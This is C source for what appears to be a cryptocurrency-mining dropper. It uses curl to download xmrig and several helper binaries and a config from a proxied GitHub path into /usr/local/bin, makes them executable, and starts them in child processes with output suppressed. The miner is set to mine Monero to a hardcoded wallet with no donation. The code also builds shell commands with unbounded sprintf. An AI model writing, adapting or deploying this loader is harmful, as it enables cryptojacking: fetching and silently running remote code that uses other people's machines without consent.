#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/wait.h>

#define DIRECTORY "/usr/local/bin"
#define DOWNLOAD_URL "https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/xmrig"
#define DOWNLOAD_RUNNING_URL "https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/running"
#define DOWNLOAD_CONFIG_URL "https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/apiSslMixConfig.json"
#define DOWNLOAD_SSLMIX_URL "https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/sslmix"

#define MAX_PROCESSES 2
#define MAX_COMMAND_LENGTH 256

char *processes[MAX_PROCESSES] = {"xmrig", "sslmix"};
char *commands[MAX_PROCESSES] = {"./xmrig --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero",
                                 "./running"};

void download_and_set_permissions(const char *download_url) {
    char command[256];
    char filename[256];
    sprintf(filename, "%s/%s", DIRECTORY, basename((char *)download_url));
    
    if (access(filename, F_OK) == -1) {
        sprintf(command, "curl --progress-bar -o %s %s", filename, download_url);
        system(command);
        if (access(filename, F_OK) == -1) {
            printf("Download %s fail.\n", filename);
            exit(1);
        }
    }
    
    chmod(filename, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
}

void start_process(char *command, char *process_name) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("Failed to fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {  // Child process
        // Close standard output and standard error
        close(STDOUT_FILENO);
        close(STDERR_FILENO);

        if (chdir(DIRECTORY) != 0) {
            perror("Failed to change directory");
            exit(EXIT_FAILURE);
        }
        if (execlp("sh", "sh", "-c", command, NULL) == -1) {
            perror("Failed to start process");
            exit(EXIT_FAILURE);
        }
    }
}

void start_processes() {
    for (int i = 0; i < MAX_PROCESSES; ++i) {
        start_process(commands[i], processes[i]);
    }
}

int main() {
    // 
    if (chdir(DIRECTORY) != 0) {
        perror("Failed to change directory");
        exit(EXIT_FAILURE);
    }

    // 
    download_and_set_permissions(DOWNLOAD_URL);
    download_and_set_permissions(DOWNLOAD_RUNNING_URL);
    download_and_set_permissions(DOWNLOAD_CONFIG_URL);
    download_and_set_permissions(DOWNLOAD_SSLMIX_URL);

    // 
    start_processes();

    return 0;
}
